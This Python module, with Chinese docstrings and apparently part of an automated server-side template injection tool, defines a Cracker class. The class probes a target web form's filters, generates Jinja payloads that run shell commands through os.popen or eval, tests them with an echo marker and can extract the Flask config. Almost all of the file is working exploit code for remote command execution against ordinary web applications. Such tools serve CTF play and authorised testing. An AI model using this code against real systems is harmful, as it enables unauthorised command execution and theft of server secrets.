"""攻击指定的路径

"""

import logging
import random
import time
import functools

from collections import namedtuple
from string import ascii_lowercase
from typing import Union, Callable, Dict, Tuple

from .payload_gen import TargetAndSubTargets, find_bad_exprs
from .form import random_fill
from .submitter import FormSubmitter, RequestSubmitter, Submitter
from .colorize import colored
from .const import (
    ATTRIBUTE,
    CHAINED_ATTRIBUTE_ITEM,
    ENVIRONMENT_JINJA,
    LITERAL,
    STRING,
    CONFIG,
    EVAL,
    OS_POPEN_READ,
    DETECT_MODE_ACCURATE,
    REPLACED_KEYWORDS_STRATEGY_IGNORE,
    FLASK_CONTEXT_VAR,
)
from .waf_func_gen import WafFuncGen, combine_waf
from .full_payload_gen import FullPayloadGen
from .context_vars import ContextVariableUtil

logger = logging.getLogger("cracker")
Result = namedtuple("Result", "full_payload_gen input_field")


class EvalArgsModePayloadGen:
    def __init__(self, will_print):
        self.will_print = will_print

    def generate(self, gen_type, *args):
        if gen_type == OS_POPEN_READ:
            return f"__import__('os').popen({repr(args[0])}).read()", self.will_print
        elif gen_type == EVAL:
            req = args[0]
            assert (
                req[0] == STRING
            ), "Only eval string is supported but inputs is " + repr(req)
            return f"eval({repr(req[1])})", self.will_print
        elif gen_type == CONFIG:
            return (
                "[v.config for v in sys.modules['__main__'].__dict__.values() if isinstance(v, sys.modules['flask'].Flask)][0]",
                self.will_print,
            )
        return None, None


class Cracker:
    """
    针对某个网站进行攻击
    """

    test_cmd = "echo f3n  j1ng;"
    test_eval = "'f'+str(3)+'n j'+str(1)+\"ng\""
    test_result = "f3n j1ng"

    def __init__(
        self,
        submitter: Submitter,
        callback: Union[Callable[[str, Dict], None], None] = None,
        detect_mode: str = DETECT_MODE_ACCURATE,
        replaced_keyword_strategy: str = REPLACED_KEYWORDS_STRATEGY_IGNORE,
        environment: str = ENVIRONMENT_JINJA,
    ):
        self.detect_mode = detect_mode
        self.subm = submitter

        self._callback: Callable[[str, Dict], None] = (
            callback if callback else (lambda x, y: None)
        )
        self.waf_func_gen = WafFuncGen(
            submitter,
            callback=callback,
            detect_mode=detect_mode,
            replaced_keyword_strategy=replaced_keyword_strategy,
        )
        self.environment = environment

    @property
    def callback(self):
        """Callback函数

        Returns:
            Callable: Callback函数
        """
        return self._callback

    @callback.setter
    def callback(self, callback):
        self._callback = callback
        self.waf_func_gen.callback = callback

    def test_payload(self, payload: str, will_print: bool) -> str:
        """测试某个执行shell指令的payload是否会产生回显

        Args:
            payload (str): 用于测试的payload
            will_print (bool): payload是否会产生回显

        Returns:
            str: 测试结果
        """
        logger.info(
            "Testing generated payload.",
        )
        result = self.subm.submit(payload)
        assert result is not None
        status_code, text = result
        if status_code == 500:
            return "FAIL_500"
        return (
            "SUCCESS" if self.test_result in text or not will_print else "FAIL_UNKNOWN"
        )

    def test_payload_eval_args(self, payload: str, subm: Submitter) -> bool:
        """测试某个进行eval的payload是否会产生回显

        Args:
            payload (str): 用于测试的payload
            subm (Submitter):
                用于提交payload的submitter, 可能和self中的submitter不同

        Returns:
            bool: 是否产生回显
        """
        logger.info(
            "Testing generated payload as eval args.",
        )
        result = subm.submit(payload)
        assert result is not None
        _, text = result
        return self.test_result in text

    def has_respond(self) -> bool:
        """测试对应的submitter是否会产生回显（显示我们提交的数据）

        Returns:
            bool: 是否产生回显
        """
        for _ in range(10):
            content = random.choice(ascii_lowercase) * 6
            resp = self.subm.submit(content)
            assert resp is not None, "HTTP Failed"
            if content in resp.text:
                return True
        return False

    def crack_with_waf(
        self, waf_func, waf_expr_func=None
    ) -> Union[Tuple[FullPayloadGen, bool, str, TargetAndSubTargets], None]:
        full_payload_gen = FullPayloadGen(
            waf_func,
            callback=None,
            detect_mode=self.detect_mode,
            environment=self.environment,
            waf_expr_func=waf_expr_func,
        )
        result = full_payload_gen.generate_with_tree(OS_POPEN_READ, self.test_cmd)
        if result is None:
            return None
        payload, will_print, tree = result
        test_result = self.test_payload(payload, will_print)
        return full_payload_gen, will_print, test_result, tree

    def log_with_result(self, will_print, test_result):
        if will_print:
            if test_result == "SUCCESS":
                logger.info(
                    "%s Now we can generate payloads.",
                    colored("green", "Success!", bold=True),
                )
            elif test_result == "FAIL_UNKNOWN":
                logger.info(
                    "%s! Generated payloads might be useless.",
                    colored("yellow", "Test Payload Failed", bold=True),
                )
            else:  # test_result == "FAIL_500"
                logger.info(
                    "Target return status code %s!",
                    colored("yellow", "500", bold=True),
                )
        else:
            if test_result == "FAIL_500":
                logger.info(
                    "Target return status code %s! (although payload won't print anything)",
                    colored("yellow", "500", bold=True),
                )
            else:
                logger.info(
                    "We WON'T SEE the execution result! "
                    + "You can try generating payloads anyway.",
                )

    def expr_waf_not500(self, tree, outer_pattern, context_vars: ContextVariableUtil):
        def is_expr_bad(expr):
            payload = context_vars.get_payload(
                context_vars.context_payloads
            ) + outer_pattern.replace("PAYLOAD", expr)
            result = self.subm.submit(payload)
            assert result is not None
            status_code, _ = result
            logger.info(
                "payload %s generate status code %s",
                colored("blue", payload),
                colored("yellow", status_code),
            )
            return status_code == 500

        exprs = [payload for payload, _ in find_bad_exprs(tree, is_expr_bad)]

        @functools.lru_cache(500)
        def new_waf(s):
            return all(expr not in s for expr in exprs) and not is_expr_bad(s)

        return new_waf

    def crack(self) -> Union[FullPayloadGen, None]:
        """开始进行攻击，生成一个执行shell命令的payload，测试并返回payload生成器

        Returns:
            Union[FullPayloadGen, None]: 生成器
        """
        logger.info("Cracking...")
        waf_func = self.waf_func_gen.generate()
        result = self.crack_with_waf(waf_func)
        if not result:
            return None
        full_payload_gen, will_print, test_result, tree = result
        self.log_with_result(will_print, test_result)
        if test_result == "FAIL_500":
            logger.info(colored("yellow", "Start fixing status code 500.", bold=True))
            logger.info(
                colored(
                    "yellow", "IT MIGHT MAKE YOUR COMMAND EXECUTE TWICE!", bold=True
                )
            )
            logger.info(
                colored("yellow", "Use Ctrl+C to exit if you don't want it!", bold=True)
            )
            time.sleep(6)
            waf_expr_func = self.expr_waf_not500(
                tree, full_payload_gen.outer_pattern, full_payload_gen.context_vars
            )
            result = self.crack_with_waf(waf_func, waf_expr_func=waf_expr_func)
            if result:
                full_payload_gen, will_print, test_result, tree = result
            if test_result == "FAIL_500":
                logger.info("It's still 500, sorry...")
            self.log_with_result(will_print, test_result)
        return full_payload_gen

    def crack_eval_args(self) -> Union[Tuple[Submitter, EvalArgsModePayloadGen], None]:
        """开始进行攻击，生成一个会eval GET参数x中命令的payload, 将其放进一个新的submitter中并返回。
        新的submitter会填充GET参数x、提交并返回结果。

        Returns:
            Union[Tuple[FullPayloadGen, Submitter, bool], None]:
                产生的payload生成器，提交器，以及是否会产生回显
        """
        args_target_field = "x"
        logger.info("Cracking with request GET args...")
        assert isinstance(
            self.subm, FormSubmitter
        ), "Currently onlu FormSubmitter is supported"
        waf_func = self.waf_func_gen.generate()
        full_payload_gen = FullPayloadGen(
            waf_func,
            callback=None,
            detect_mode=self.detect_mode,
            environment=self.environment,
        )
        payload, will_print = full_payload_gen.generate(
            EVAL,
            (
                CHAINED_ATTRIBUTE_ITEM,
                (FLASK_CONTEXT_VAR, "request"),
                (ATTRIBUTE, "values"),
                (ATTRIBUTE, args_target_field),
            ),
        )
        if payload is None:
            return None
        assert will_print is not None, "It just shouldn't! when payload is not None!"
        payload_dict = {self.subm.target_field: payload}
        method = self.subm.form["method"]
        assert isinstance(method, str)
        payload_param = random_fill(self.subm.form)
        payload_param.update(payload_dict)
        new_subm = RequestSubmitter(
            url=self.subm.url,
            method=method,
            target_field=args_target_field,
            params=payload_param if method == "GET" else {},
            data=payload_param if method != "GET" else {},
            requester=self.subm.req,
        )
        if self.subm.tamperers:
            for tamperer in self.subm.tamperers:
                new_subm.add_tamperer(tamperer)
        if will_print:
            if self.test_payload_eval_args(self.test_eval, new_subm):
                logger.info(
                    "%s Now we can generate payloads.",
                    colored("green", "Success!", bold=True),
                )
            else:
                logger.info(
                    "%s! Generated payloads might be useless.",
                    colored("yellow", "Test Payload Failed", bold=True),
                )
        else:
            logger.info(
                "We WON'T SEE the execution result! "
                + "You can try generating payloads anyway.",
            )

        return new_subm, EvalArgsModePayloadGen(will_print)
